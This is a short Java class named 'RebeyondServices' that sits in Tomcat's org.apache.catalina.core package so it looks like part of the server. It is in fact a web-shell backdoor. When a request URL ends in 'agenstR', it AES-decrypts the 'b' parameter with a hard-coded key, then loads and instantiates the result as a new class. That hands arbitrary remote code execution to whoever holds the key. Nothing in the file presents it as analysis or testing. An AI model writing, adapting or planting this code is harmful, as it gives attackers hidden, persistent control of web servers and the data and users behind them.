package org.apache.catalina.core;

import org.apache.catalina.core.utils.Util;

public class RebeyondServices {

    public static String SERVICE_URL = "agenstR";

    public static void doServices(java.util.Map rdd, Object obj) throws Throwable {
        if (((String) rdd.get("url")).matches("/(.*)" + org.apache.catalina.core.RebeyondServices.SERVICE_URL)) {
            String k = "e45e329feb5d925b";
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
            byte[] data = Util.decode((String) rdd.get("b"));
            Class clazz = Util.extendClassLoader(c.doFinal(data), ((java.util.Map) obj).get("request"));
            Util.instantiate(clazz).equals(obj);
        }
    }

}
